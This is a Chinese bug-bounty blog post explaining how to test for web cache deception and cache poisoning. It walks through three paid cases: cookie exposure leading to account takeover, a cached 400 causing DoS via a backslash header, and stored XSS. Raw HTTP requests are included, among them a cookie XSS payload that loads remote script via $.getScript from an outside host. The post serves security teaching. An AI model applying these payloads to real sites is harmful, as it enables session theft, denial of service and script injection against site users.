#  如何测试Cache相关的漏洞   
@bxmbn  迪哥讲事   2024-01-06 22:28  
  
声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。  
  
- 前言  
  
- 方法  
  
- 案例1.由缓存欺骗至账户接管→赏金:1500美元  
  
- 思路  
  
- 案例2:由缓存中毒提升至DoS→赏金:1000美元  
  
- 思路  
  
- 案例3:由缓存中毒到储存型XSS→赏金:1000美元  
  
- 思路  
  
## 前言   
  
本文以真实的案例来讲解如何发现cache相关的漏洞.  
## 方法   
> 如果应用程序没有登录功能，但使用了Akamai CDN的服务，步骤如下:  
  
  
发送第一个请求到Burp suite的Repeater:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JOXQ5VctWATXbyR4tsnXOZAKNmPWPOuwK7xjDB9gNV6jzT7fPHVJm3gQ/640?wx_fmt=png "")  
  
img_1.png  
  
检查服务器是否缓存正常的请求(你可以通过响应头“server - timing: cdn-cache;desc=HIT”来判断)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JOgwD8DBY8Fc1Gtm17TsXCYXxicx5YEer5HI9KzDb7jfq1Q91bfJTg8tA/640?wx_fmt=png "")  
  
img_2.png  
  
在请求中添加非法请求头 (注意:host下面一行的\)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JONNFicFsaTMUMYqB17Iqjn14bdTNCGN7JbicQn99s4OHS4QzAEDDOIyBw/640?wx_fmt=png "")  
  
img_3.png  
  
如果成功缓存了响应，那么当您在任何浏览器上打开URL时，应该会得到一个400 Bad Request,如下图所示:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JOgxtJ4FW3EQZTJVQtyCtgG0KyN4VvrXSDm1Bibfzqk9kJ9d7Dunn6Ucw/640?wx_fmt=png "")  
  
img_4.png  
> 如果应用程序有登录功能:  
  
- 创建一个帐户  
  
- 检查一下在任何页面中是否有任何敏感信息被公开(例如会话或者令牌)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JO7YZB0nSupYf71c1P3KwAyYewFAE3iadVLicdb1385q5GYznZ6h3zciaZA/640?wx_fmt=png "")  
  
img_5.png  
- 发送请求到Repeater  
  
- 在URL的末尾添加一个能缓存的扩展名(.js,.css)，看看它是否给出了一个200 OK的响应 (注意看接口的末尾,多了.js,可以与第一张图进行对比)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JOrOoF4KdHwAPiavwdO9qvVNvUnqKn7C3sicQMGeZrScfGJ4YTBYWIBaTw/640?wx_fmt=png "")  
  
img_6.png  
  
使用经过验证的帐户打开修改后的URL  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JOylyfPxiajuDMvjr8MDzic3kYpUMWI3x4ARCz7FYwFeRmCzmfXeTCQFqw/640?wx_fmt=png "")  
  
img_7.png  
  
使用curl或Private Web Browser窗口打开相同的URL:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JOr5gPNdXfbocCVdXrHtOOPuDzLK1YxuibRTkEgEBcEmNSo1FZ3attibjA/640?wx_fmt=png "")  
  
img_8.png  
  
如果成功缓存了令牌，应该在响应中看到令牌  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JOjXPCcVDGFWneqdrkhLCibM5psMGpqhDRXOU6R0zCiaraCRQfqEAsI2EA/640?wx_fmt=png "")  
  
img_9.png  
> 如果应用程序使用Cloudflare CDN  
  
  
非法请求头是行不通的，现在大多数Cloudflare客户都在使用缓存欺骗保护 (https://developers.cloudflare.com/cache/about/cache-deception-armor/)  
  
我使用.avif文件能够绕过这个保护，这是一个真正未知的扩展名文件。  
  
具体参考: https://hackerone.com/reports/1391635  
  
也有一些网站没有使用这个保护，你可以尽情地测试缓存中毒/欺骗;  
## 案例1.由缓存欺骗至账户接管→赏金:1500美元   
### 思路  
  
所有的cookie(甚至httponly)都在https://host.com/app/conversation/1.js中公开  
  
如果一个经过身份验证的用户访问这个URL，他们所有的cookie都将存储在缓存中  
  
然后攻击者就可以提取cookie并劫持他们的Session  
> 提示和技巧  
  
  
在某些应用程序中，如果你在扩展之前添加一个分号(;)，可能会给你一个200 Ok的响应  
  
比如:  /xxxx/xxxxxx/;.js  
  
响应为:  
```
HTTP/2 200 Ok


```  
## 案例2:由缓存中毒提升至DoS→赏金:1000美元   
### 思路  
  
在Akamai CDN中，如果我们发送一个反斜杠\ 作为报头，服务器将响应一个400坏请求响应  
  
请求:  
```
GET /products/xxx/xxxx/xxx/?test HTTP/2
Host: www.host.com
\: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers

```  
  
响应:  
```
HTTP/2 400 Bad Request
Content-Type: text/html;charset=iso-8859-1
Content-Length: 70
Cache-Control: max-age=297
Expires: Thu, 21 Jul 2022 16:17:54 GMT
Date: Thu, 21 Jul 2022 16:12:57 GMT
Server-Timing: cdn-cache; desc=HIT
Server-Timing: edge; dur=32
Server-Timing: origin; dur=147
Strict-Transport-Security: max-age=86400
Ak-Uuid: 0.bc85d817.1658419977.1592c61


```  
  
当站点使用缓存服务器时，这就会成为一个问题。网站通常只缓存javascript, css和其他文件，但当网站如www.host.com也缓存正常的响应，如  
```
www.host.com/products/*

www.host.com/*


```  
  
它会成为一个非常有影响力的bug。  
- 提示和技巧  
  
对于这个漏洞，Akamai有一个解决方案，通过让400响应在缓存中只持续5秒，然而，攻击者可以在burp中使用intruder模块发送null有效负载，这样相同的400响应就永远被缓存了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5eQ8eVqcyAp1DUH0ibCh4JOqJ1DRRJGsAiaCrDnbZpiczesuZdC4jPQC6LVViaQicyNAUkBOgVVU5ju9w/640?wx_fmt=png "")  
  
img_10.png  
## 案例3:由缓存中毒到储存型XSS→赏金:1000美元   
### 思路  
  
有一个通过n_vis Cookie参数的XSS  
  
由于服务器缓存了此响应，攻击者可以保存XSS有效负载  
  
有一个强大的过滤器(和WAF)，可以阻止大多数有效负载，但由于该网站使用Jquery，攻击者可以使用$.getScript函数 。  
  
请求:  
```
GET /xxxx/xx-xx.otf?triagethiss HTTP/2
Host: www.host.com
Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-xss,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers


```  
  
响应:  
```

<script>
...
Visitor.id='xssx'*$.getScript`//593.xss.ht`//;
....
</script>
```  
> 提示和技巧  
  
  
测试XSS上的任意请求头，cookie，自定义头，x-forward-*头  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 往期回顾  
  
  
[xss研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487130&idx=1&sn=e20bb0ee083d058c74b5a806c8a581b3&chksm=e8a604f9dfd18defaeb9306b89226dd3a5b776ce4fc194a699a317b29a95efd2098f386d7adb&scene=21#wechat_redirect)  
  
  
[SSRF研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[2022年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
  
## 福利视频  
  
笔者自己录制的一套php视频教程(适合0基础的),感兴趣的童鞋可以看看,基础视频总共约200多集,目前已经录制完毕,后续还有更多视频出品  
  
https://space.bilibili.com/177546377/channel/seriesdetail?sid=2949374  
## 技术交流  
  
技术交流请加笔者微信:richardo1o1 (暗号:growing)  
  
  
